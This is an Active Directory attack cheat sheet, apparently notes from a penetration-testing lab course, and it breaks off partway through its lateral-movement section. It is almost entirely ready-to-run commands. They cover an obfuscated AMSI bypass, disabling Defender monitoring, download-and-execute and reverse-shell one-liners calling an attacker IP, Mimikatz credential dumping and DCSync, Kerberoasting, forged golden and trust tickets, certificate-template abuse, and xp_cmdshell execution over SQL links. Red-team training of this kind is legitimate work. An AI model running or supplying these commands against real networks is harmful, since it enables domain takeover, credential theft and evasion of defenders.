# CheatSheet
## Index
* [General](#general)
  * [Port Forwarding](#create-a-port-forwarding)
  * [Copy to Remote Server](#copy-to-remote-server)
  * [AMSI Bypass](#amsi-bypass)
  * [Disable AV monitoring](#disable-av-monitoring)
  * [Enumerate Language mode and Applocker](#enumerate-languagemode-and-applocker)
  * [Reverse Shell](#reverse-shells)
  * [Convert Certificates](#convert-certificates)
  * [Check Whitelisted Paths](#check-whitelisted-paths)
* [Enumeration](#enumeration)
  * [Enumeration using AD Module](#domain-enumeration-using-activedirectory-module)
  * [Enumeration using PowerView](#domain-enumeration-using-powerview)
  * [Bloodhound](#bloodhound)
* [Privilege Escalation](#privilege-escalation)
  * [Local Privilege Escalation](#local-admin-privilege-escalation-using-powerup)
  * [Kerberoasting](#privilege-escalation-using-kerberoasting)
  * [Targeted Kerberoasting AS-REPs](#privilege-escalation-using-targeted-kerberoasting-asreps)
  * [Targeted Kerberoasting Set SPN](#privilege-escalation-using-targeted-kerberoasting-set-spn)
  * [Kerberos Unconstrained Delegation](#privlege-escalation-using-kerberos-unconstrained-delegation)
  * [Kerberos Constrained Delegation](#privilege-escalation-using-kerberos-constrained-delegation)
  * [Kerberos Resource-Based Constrained Delegation](#privilege-escalation-using-kerberos-resourcebased-constrained-delegation)
  * [Across Trust](#privilege-escalation-across-trust)
  * [Privilege Escalation - Child to Parent](#privilege-escalation-child-to-parent)
  * [Child to Parent - Trust Tickets](#privilege-escaltion-using-trust-tickets)
  * [Child to Parent - Krbtgt Hash](#privilege-escalation-using-krbtgt-hash)
  * [Across Forest - Trust Ticket](#privilege-escalation-across-forest-using-trust-ticket)
  * [Across Forest - AD CS](#privilege-escalation-across-forest-adcs)
  * [MSSQL](#privilege-escalation-using-mssql)
* [Kerberos](#kerberos)
  * [Introduction](#introduction)
  * [Kerberos Delegation](#kerberos-delegation)
* [Persistence](#persistence)
  * [Golden Ticket](#persistence-using-golden-tickets)
  * [Silver Ticket](#persistence-using-silver-tickets)
  * [Diamond Ticket](#persistence-using-diamond-tickets)
  * [Skeleton Key](#persistence-using-skeleton-key)
  * [DSRM](#persistence-using-dsrm)
  * [ACLs AdminSDHolder](#persistence-using-acls-adminsdholder)
  * [ACLs Rights Abuse](#persistence-using-acls-rights-abuse)
  * [ACLs Security Descriptors](#persistence-using-acls-security-descriptors)
 
<div style="page-break-after: always;"></div>

## General
Connect to a machine with Administrator privileges
```
Enter-PSSession -Computername <computername>
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

Execute commands on remote machines
```
Invoke-Command -Computername <computername> -Scriptblock {whoami} 
Invoke-Command -Scriptblock {whoami} $sess
```

Load Script on a machine
```
Invoke-Command -Computername <computername> -FilePath <path>
Invoke-Command -FilePath <path> $sess
```

Download and Load script on a machine
```
iex (iwr http://<my_ip>/<scriptname> -UseBasicParsing)
```

### Create a port forwarding 
```
"netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<my_ip>"
```

### Copy to Remote Server
Powershell command
```
Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
```

Cmd command
```
echo F | xcopy <file_to_copy> \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

### AMSI Bypass
The first one could be detected
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
```
$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
```
```
Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
```

### Disable AV monitoring
Powershell command to disable AV
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Enumerate Language mode and Applocker
Enumerate the Language Mode
```
$ExecutionContext.SessionState.LanguageMode
```

Enumerate the Applocker policies
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Reverse-Shells
Command to download and execute a reverse-shell
```
powershell iex (iwr -UseBasicParsing http://<my_ip>/Invoke-PowerShellTcp.ps1);power -Reverse -IpAddress <my_ip> -Port 443
```

**Note:** Remember to start the listener using netcat
```
nc64.exe -lvp 443
```

**Note:** Remember to open the server using hfs.exe and insert the file required (in this case InvokePowerShellTcp.ps1)

### Convert Certificates
with the command below it is possible to convert a .pem certificate in a .pfx one:
```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\AdministratorCerificate.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```

### Check Whitelisted Paths
This command will provide the applocker constraints also for scripts
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRVP2
```

Using the following command it is possible to check in which locations scripts execution is allowed
```
Get-ApplockerPolicy -Effective | select -ExpandProperty RuleCollections
```

<div style="page-break-after: always;"></div>

## Enumeration
### Domain Enumeration Using ActiveDirectory Module
Enumerate current domain 
```
Get-ADDomain
```

Enumerate object of another domain
```
Get-ADDomain -Identity <domain>
```

Get domain SID for the current domain
```
(Get-ADDomain).DomainSID
```

Get Domain Policy for the current domain
```
(GetDomainPolicyData).systemaccess
```

Get Domain Policy for another domain
```
(GetDomainPolicyData -domain <domain>).systemaccess
```

Get domain controllers for the current domain
```
Get-ADDomainController
```

Get domain controllers for another domain
```
Get-ADDomainController -DomainName <domain> -Discover
```

Get list of users of the current domain
```
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity <username> -Properties *
```

Get list of all properties for users in the current domain
```
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Memeber -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastser)}}
```

Look for particular string in a user's attribute
```
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```

Get list of computers in the current domain
```
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatinSystem | selct Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

Get all the groups in the current domain
```
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *
```

Get all the groups containing the world "admin" in group name
```
Get-ADGroup -Filter 'Name -like "*admin*" | select Name
```

Get all the members of Domain Admin group
```
Get-ADGroupMember -Identity "Domain Admins" -Recursive
```

Get the group membership for a user
```
Get-ADPricipalGroupMembership -Identity <username>
```

**Domain Enumeration Trust**
Get a list of all domain trusts for the current domain
```
Get-ADTrust
Get-ADTrust -Identity <domain>
```

Get details about the current forest
```
Get-ADForest
Get-ADForest -Identity <domain>
```

Get all domains in the current forest
```
(Get-ADForest).Domains
```

Get global catalogs for the current forest
```
Get-ADForest | select -ExpandProperty GlobalCatalogs
```

Get trusts of a forest
```
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

### Domain Enumeration Using PowerView
Enumeration of domain information
```
Get-Domain 
```

Enumeration of all the domain users
```
Get-DomainUser
```

Enumerate all the user properties
```
Get-DomainUser -Identity <username> -Properties *
```

Enumerate Domain object of another Domain
```
Get-Domain -Domain <domain_name>
```

Enumerate all the users of a Group
```
Get-DomainGroupMember -Identity "<group_name>" -Recursive
```

Enumerate Forest name
```
Get-Domain | select Forest
```

Enumerate the Enterprise Admins, we need to query the master DC of the forest
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain <forestname>
```

**Enumerate the GPOs using PowerView.ps1**

Enumerate the organization unit (OU)
```
Get-DomainOU
```

Enumerate only the OU names
```
Get-DomainOU | select name
```

List all the computers in an OU
```
(Get-DomainOU -Identity <OU>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

Enumerate all the Domain GPO
```
Get-DomainGPO
```

Enumerate the GPO for a specific OU
```
(Get-DomainOU -Identity <OU>).gplink
```

Enumerate GPO associated to a gplink, the name of the GPO is something like this {7478F170-6A0C-490C-B355-9E4618BC785D}
```
Get-DomainGPO -Identity '{GPO_name}'
```

**Enumerate ACLs using PowerView.ps1**
Enumerate the Domain ACLs
```
Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs -verbose
```

Enumerate the AD rights for a specific user
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<username>"}
```

Check if AD rights are binded to a specific group instead of users
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<Group_name>"}
```

**Enumerate the Domain Trust using PowerView**
Enumerate all the domains in the forest
```
Get-ForestDomain -Verbose
```

Map the trust of the current domain, choose the trust attribute basing on the available ones
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "<Trust_attribute>"}
```

**Enumeration of Local Groups**

List all the local groups on a machine
```
Get-NetLocalGroup -ComputerName <machine_name>
```

Get members of the local group "Administrator" on a machine
```
Get-NetLocalGroupMember -ComputerName <machine_name> -GroupName Administrator
```

Get actively logged users on a computer
```
Get-NetLoggedon -ComputerName <machine_name>
```

Get locally logged users on a computer (needs remote registry on the target - started by default on server OS)
```
Get-LoggedonLocal -ComputerName <machine_name>
```

Get the last logged user on a computer 
```
Get-LastLoggedOn -ComputerName <machine_name>
```
**NOTE:** all of this commands need administrative privileges on non-dc machines or on target to be run

**Enumerate Shares and Files**

Find shares on hosts in current domain
```
Invoke-ShareFinder -Verbose
```

Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```

Get all fileservers on the domain
```
Get-NetFileServer
```

## BloodHound
Provides a GUI for AD entities and relationships for the data collected by its ingestors. It uses Graph Theory for providing the capability of mapping shortest path for interesting things lik Domain Admins. Furthermore, it provides built-in queries for frequently used actions.

### Install neo4j
Open cmd as Administrator and open the following directory
```
cd C:\AD\Tools\neo4j-community-4.1.1-windows\neo4j-community-4.1.1\bin
```

Install neo4j
```
neo4j.bat install-service
```

Start neo4j service
```
neo4j.bat start 
```

Browse to http://localhost:7474 and login using the following credentials

- user: neo4j
- password: bloodhound

**NOTE**: In order to perform the following command remember to bypass .NET AMSI

In order to supply data to BloodHound perform the following commands
```
Invoke-BloodHound -CollectionMethod All
```

Or perform the follwing command
```
SharpHound.exe
```

To make BloodHound collection stealthy use *-Sthealt* option
```
Invoke-BloodHound -Stealth
```

or with SharpHound
```
SharpHound.exe --stealth
```

To avoid detections like MDI
```
Invoke-BloodHound -ExcludeDCs
```

The gathered data can be uploaded to the BloodHound application.
<div style="page-break-after: always;"></div>

## Privilege Escalation
### Useful tools 
- [PowerUP](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- [Privesc](https://github.com/enjoiz/Privesc)
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

### Local privilege escalation methods

There are various ways of locally escalating privileges in Windows box:
- Missing patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstallElevated (any user can run MSI as SYSTEM)
- Misconfigured Services
- DLL Hijacking and more
- [NTLM Relaying a.k.a Won't Fix](https://github.com/antonioCoco/RemotePotato0)

### Local Admin Privilege Escalation using PowerUp
Load the PowerUp.ps1 module
```
. .\PowerUp.ps1
```

Enumerate exploitable unquoted service
```
Get-ServiceUquoted -Verbose
```

Get services where current user can write to its binary path or change arguments to the binary
```
Get-ModifiableServiceFile -Verbose
```

Enumerate services vulnerable to config modify
```
Get-ModifiableServices
```

Add user to local admin group using PowerView.ps1 (**Noisy**)
```
Invoke-ServiceAbuse -Name '<service_name>' -Username <domain\username>
```

Add user to local admin group using sc.exe (**more OPSEC**)
```
sc.exe <service_name> config binpath= "\\dcorp-student499\payload.exe"
```

**NOTE:** remember to logoff and logon to apply the changes

Enumerate where the user has local admin privileges inside the domain using Find-PSRemotingLocalAdminAccess.ps1
```
. .\Find-PSRemotingLocalAdminAccess.ps1
```

Perform the enumeration
```
Find-PSRemotingLocalAdminAccess
```

### Privilege Escalation using Kerberoasting
This is a method that consists in cracking of service account passwords. Each Kerberos session ticket (TGS) has a server protion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
This techinque is very useful because service accounts passwords are not frequently changed.

Run the following command to find user accounts used as service accounts using AD module
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Find user accounts used as service accounts using PowerView
```
Get-DomainUser -SPN
```

We can use Rubeus to list the Kerberoast stats
```
Rubeus.exe kerberoast /stats
```

Use Rubeus to request a TGS
```
Rubeus.exe kerberoast /user:<username> /simple
```

Kerberoast all possible accounts
```
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

Crack a ticket using John the Ripper
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

### Privilege Escalation Using Targeted Kerberoasting ASREPs
If a user's UAC settings have "Do not require  Preauthentication" enabled, it is possible to grab user's crackable AS-REP and bruteforce it offline. With sufficient rights (GenericWrite or GenericAll)  preauth can be forced disabled as well.

With the following PowerView command it is possible to enumerate all the accounts having  Preauth disabled
```
Get-DomainUser -PreauthNotRequired -Verbose
```

To force disable  preauth run the following commands using PowerView

Enumerate the permissions for RDPusers on ACLs 
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
```
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
```
```
Get-DomainUser -PreauthNotRequired -Verbose
```

Request encrypted AS-REP for offline brute-force using ASREPRoast
```
Get-ASREPHash -UserName <username> -Verbose
```

To enumerate all the users with  Preauth disabled using ASREPRoast
```
Invoke-ASREPRoast -Verbose
```

### Privilege Escalation using Targeted Kerberoasting Set SPN
With enough rights (GenericAll/GenericWrite) a target user's SPN can be set to anything (unique in the domain). We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

Enumerate the permissions for RDPUsers on ACLs using PowerView:
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

Using PowerView, see if the user already has a SPN:
```
Get-DomainUser -Idenitity <username> | select serviceprincipalname
```

Set a SPN for the user 
```
Set-DomainObject -Idenitity <username> -Set @{serviceprincipalname='dcorp/whatever1'}
```

Then Kerberoast the user 

### Privilege escalation using Kerberos Unconstrained Delegation
When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as user. When unconstrained delegation is enabled, the DC places the user's TGT inside TGS. When presented to the server with unconstrained delgation, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user. 

This method can be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine.

Run the following command to discover computer with unconstrained delegation enabled using PowerView:
```
Get-DomainComputer -Unconstrained
```

Compromise the server where unconstrained delegation is enabled, then we must trick or wait for domain admin to connect a service on the computer with unconstrained delegation enabled.

Then we can export the tickets running the command:
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

We can trick a privileged user to connect to a machine with unconstrained delegation using the Printer Bug. A feature of MS-RPRN which allows any domain user to force any machine to connect to second a machine of the domain user's choice. We can force the Domain Controller to connect to the server with unconstrained delegation by abusing the printer bug

Start the listener on the server with unconstrained delegation:
```
Rubeus.exe monitor /interval:5 /nowrap
```

Then on the student VM run the printer bug.
```
MS-RPRN.exe \\<domain_controller.domain> \\<unconstrained_delegation_machine.domain>
```

Copy the base64 encoded TGT, then remove extra spaces and use it on the student VM
```
Rubeus.exe ptt /ticket
```

Once the ticket is injected run DCSync
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

### Privilege Escalation using Kerberos Constrained Delegation

Constrained delegation when enabled on a service account, allow access only to specified services on specified computers and user. A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorizations.

To impersonate the user, Service for User (S4U) extension is used, which provides two extensions:
- Service for User to Self (S4U2self): allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION User account control attribute
- Service for User to Proxy (S4Uproxy) - Allows a service to obtain TGS to a second service on behalf of a user. Which second service ? This is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which user tokens can be forwarded.

**Example scenario**
1. A user - Joe, authenticates to the web service (running with the service account websvc) using a non-Kerberos compatible authentication mechanism
2. The web service requests a ticket from the Key Distribution Center (KDC) for Joe's account without supplying a password, as the websvc account
3. The KDC checks the websvc UAC value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that Joe's account is not blocked for delegation. If OK returns a forwardable ticket for Joe's account (S4U2self)
4. The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service.
5. The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a service ticket for dcorp-mssql (S4U2Proxy)
6. The web service can now authenticate to the CIFS on dcorp-mssql as Joe using the supplied TGS

To abuse the constrained delegation in the above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.

Enumerate users and computer having constrained delegation enabled using PowerView
```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

Abusing using Kekeo, it requires either plaintext password or NTLM hash/AES keys

Using asktgt from Kekeo, we request a TGT (step 2 and 3)
```
kekeo# tgt::ask /user:<username> /domain:<domain> /rc4:<hash>
```

Using s4u from Kekeo, we request the TGS (step 4 and 5)
```
kekeo# tgs::s4u /tgt:TGT_<username>@<domain>_krbtgt~<domain>@<domain>.kirbi /user:Adminsitrator@<domain> /service:cifs/<machine_name.domain>
```

Abusing using Rubeus we can request TGT and TGS in a single command
```
Rubeus.exe s4u /user:<user> /aes256:<aes256> /impersonateuser:Administrator /msdsspn:CIFS/<machine_name.domain> /ptt
```

Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. This is a huge issue as it allows to access many interesting services when the delegation may be for a non intrusive service

Abusing using Rubeus
```
Rubeus.exe s4u /user:<username> /aes256:<aes256> /impersonateuser:Administrator /msdsspn:time/<domain_controller.domain> /altservice:ldap /ptt
```

After the injection we can run DCSync
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

### Privilege escalation using Kerberos ResourceBased Constrained Delegation
This moves delegation authority to the resource/service adminstrator. Instead of SPNs on msDs-AllowedToDelegateTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalAllowedToDelegateToAccount) on the resource/service like SQL service.
That is, the resource/service adminstrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins

To abuse RBCD in the most effective form, we just need two privileges:
1. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.
2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain -ms-DS-MachineAccountQuota is 10 for all Domain users)

Having admin privileges on student machine that is domain joined machine. Enumeration will show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!
```
Find-InterestingDomainACL | ?{$_.identifyreferencename -match 'ciadmin'}
```

Using the ADModule, configure RBCD on dcorp-mgmt for student machine:
```
$comps = '<machine_account>','<machine_account>'
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

Now we can get the privileges of student machines by extracting its AES keys
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

Use the AES key of the student machine with Rubeus and access dcorp-mgmt as ANY user we want:
```
Rubeus.exe s4u /user:<student_machine_username> /aes:<aes256_student_machine> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```
### Privilege Escalation Across Trust
Two types of across trust:
- Across Domains: two way trust relationship between domains
- Across Forest: Trust relationship needs to be established

### Privilege Escalation Child to Parent
sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.

sIDHistory can be abused in two ways of escalating privileges:
- krbtgt hash of the child
- Trust tickets

### Privilege Escaltion using Trust Tickets
What is required to forge trust tickets is, obviously, the trust key. Look for [IN] trust key from child to parent:
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <domain_controller>

or

Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

So we can forge an inter-realm TGT by running the following command:
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<current_domain_sid> /sids:<enterprise_admins_group_parent_domain_sid> /rc4:<trust_key_rc4> /service:krbtgt /target:<target_domain> /ticket:c:\AD\Tools\trust_tkt.kirbi" "exit"
```

|  Options | Description  |
|---|---|
|  kerberos::golden | Name of the module  | 
| /domain  | FQDN of the current domain  |
| /sid | SID of the current domain |
| /sids | SID of the enterprise admins group of the parent domain |
| /rc4 | RC4 of the trust key |
| /user | user to impersonate |
| /service:krbtgt | target service in the parent domain |
| /target | FQDN of the parent domain |
| /ticket | Path where the ticket has to be saved |

Abuse the ticket using Kekeo.

Get a TGS for a service (CIFS below) in the target domain by using the forged Trust ticket
```
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/<parent_domain_controller.domain>
```

Use the TGS to access the targeted service
```
.\kirbikator.exe lsa .\CIFS.<parent_domain_controller.domain.kirbi>
```

Of course tickets for other services can also be created.

We can perform the same abuse usign Rubeus
```
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/<current_domain> /rc4:<trust_key_rc4_hash> /sid:<current_domain_sid> /sids:<parent_domain_enterprise_admins_group_sid> /ldap /user:<user_to_impersonate> /nowrap
```

Use the forged ticket
```
C:\AD\Tools\Rubeus.exe asktgs /service:http/<parent_domain_controller.domain> /dc:<parent_domain_controller.domain> /ptt /ticket:<forged_ticket>
```

|  Options | Description  |
|---|---|
| silver | Name of the module  | 
| /sid | SID of the current domain |
| /sids | SID of the enterprise admins group of the parent domain |
| /rc4 | RC4 of the trust key |
| /ldap | Retrieve PAC information from the current DC |
| /user | user to impersonate |
| /nowrap | no newlines in the output |

### Privilege Escalation using Krbtgt Hash
Once again we will exploit sIDHistory
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:<username> /domain:<current_domain> /sid:<sid_of_domain> /sids:<sid_of_enterprise_admins_group_in_parent_domain> /krbtgt:<krbtgt_hash> /ptt" "exit"
```

In the above command, the mimikatz option "/sids" is forcefully setting the sIDHistory for the enterprise admin group for a domain that is the Forest Enterprise Admin Group

We can avoid suspicious logs by using Domain Controllers group
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<sid_of_current_domain> /sids:<sid_of_domain_controller_group,sid_of_enterprise_domain_controllers> /krbtgt:<krbtgt_hash> /ptt" "exit"
```
```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync" /user:<parent_domain>\krbtgt /domian:<parent_domain>" "exit"
```

### Privilege Escalation Across Forest using Trust Tickets
Once again we require the trust key for the inter-forest trust
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

An inter-forest TGT can be forged:
```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<domain_sid> /rc4:<hash_trust_key> /service:krbtgt /target:<forest_domain> /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
```

We can perform the same actions using Rubeus
```
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/<current_domain> /rc4:<hash_trust_key> /sid:<current_domain_sid> /sids:<entreprise_admin_group_sid> /ldap /user:Administrator /nowrap
```

Use the forged ticket:
```
C:\AD\Tools\Rubeus.exe asktgs /service:http/<dc_parent_domain> /dc:<parent_domain_domain_controller.parent_domain> /ptt /ticket:<forged_ticket>
```

### Privilege Escalation Across Forest using ADCS
Active Directory Certificate Services (AD CS) enables use of public key infrastructure (PKI) in active directory forest.
ADCS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.
ADCS is the Server Role that allows you to build a public key cryptography, digital certificates and digital signature capabilities for your organization.

There are various ways of abusing ADCS:
- Extract user and machine certificates
- User certificates to retrieve NTLM hash
- User and machine level persistence
- Escalation to Domain Admin and Enterprise Admin
- Domain persistence

We can use the Certify tool to enumerate ADCS for the target forest
```
Certify.exe cas
```

Enumerate the templates:
```
Certify.exe find
```

Enumerate vulnerable templates:
```
Certify.exe find /vulnerable
```

We are going to abuse the following vulnerabilites for escalation:
- ESC1 Enrolee can request cert for ANY user
- ESC3 Request an enrollment agent certificate and use it to request certo on behalf of ANY user

Common requirements/misconfigurations in ADCS for all the escalation we have:
- CA grants normal/low-privileged users enrollment
- Manager approval is disabled
- Authorization signatures are not required
- The target template grants normal/low-privileged users enrollment rights

**ESC3**

Escalation to Domain Admin, we can now request a certificate for Certificate Request Agent using a vulnerable template
```
Certify.exe request /ca:<domain_controller.domain>\<domain>-MCORP-DC-CA /template:<vulnerable_template>
```

Convert from cert.pem to pfx and use it to request a certificate on behalf of DA
```
Certify.exe request /ca:<domain_controller.domain>\<domain>-MCORP-DC-CA /template:<vulnerable_template> /onbehalfof:<domain>\<username> /enrollmentcert:<certificate> /enrollcertpw:SecretPass@123
```

We can then use rubeus to convert from cert.pem to pfx and request DA TGT and inject it
```
Rubeus.exe asktgt /user:Administrator /cerificate:<certificate>.pfx /password:SecretPassword@123 /ptt
```

Then we can escalate to Enterprise Admin.

Convert from cert.pem to pfx and use it to request a certificate on behalf of EA using a vulnerable template:
```
Certify.exe request /ca:<parent_domain_dc.domain>\moneycorp-MCORP-DC-CA /template:<vulnerable_template> /onbehalfof:<domain>\<user> /enrollcert:<certificate> /enrollcertpw:SecretPass@123
```

Then we can request Enterprise Admin TGT and inject it
```
Rubeus.exe asktgt /user:<domain>\<user> /certificate:<certificate> /dc:<domain_controller.domain> /password:SecretPass@123 /ptt
```

**ESC1**

A vulnerable template has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag. We can find it using the following command
```
Certify.exe find /enrolleeSuppliesSubject
```

The vulnerable template allows enrollment to the RDPUser group. Request a certificate for DA or EA as normal user
```
Certify.exe request /ca:<domain_controller.domain>\moneycorp-MCORP-DCCA /template:"<vulnerable_template" /altname:administrator
```

Convert the certificate from .pem to .pfx and use it to request a TGT for DA
```
Rubeus.exe asktgt /user:administrator /certificate:<certificate>.pfx /password:SecretPass@123 /ptt
```

### Privilege Escalation Using MSSQL
MS SQL servers are generally deployed in plenty in a Windows domain. SQL servers provide very good options for lateral movement as domain users can be mapped to database roles. 

For MSSQL and PowerShell hackery we can use PowerUpSQL.

Discover performing SPN scanning
```
Get-SQLInstanceDomain
```

Check Accessibility
```
Get-SQLConnectionTestThreaded
```
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

Gather Information
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

A Database link allows a SQL server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL server, that is, linked SQL servers it is possible to execute stored procedures. 
The strenght of database links is that they work even across forest trusts.

Searching Database links
```
Get-SQLServerLink -Instance dcorp-mssql -Verbose
```

Enumerating Databese Links
```
Get-SQLServerLinkCrawl -Instance <MSSQL_server> -Verbose
```

It is possible to execute commands on a target server, either xp_cmdshell should be already enabled or if rpcout is enabled (disabled by default), xp_cmdshell can be enabled using:
```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "<server_sql>"
```

In order to execute commands run
```
Get-SQLServerLinkCrawl -Instance <server_mssql> -Query "exec master..xp_cmdshell '<command>'" -QueryTarget <server_mssql>
```

<div style="page-break-after: always;"></div>

## Lateral Movement
Below a list of techniques that may be useful to escalate to domain admin performing a credential dump or exploiting an available Domain Admin session. 

### Lateral movement using PowerShell Remoting
This tool is the best solution for passing the hashes, using credentials and executing commands on multiple remote computers
It allows to perform One-to-One lateral movements, it opens an interactive PowerShell session.
Useful commands:
```
New-PSSession
```
```
Enter-PSSession
```

It allows commands in One-to-Many mode, but is non interactive, however allows to perform commands parallely on several servers.

Useful commands:
```
Invoke-Command
```

Perform commands or scriptblocks on several servers:
```
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```

Run scripts from files on multiple servers:
```
Invoke-Command -FilePath <ps1 script path> -ComputerName (Get-Content <list_of_servers>)
```

Execute locally loaded functions on the remote machines:
```
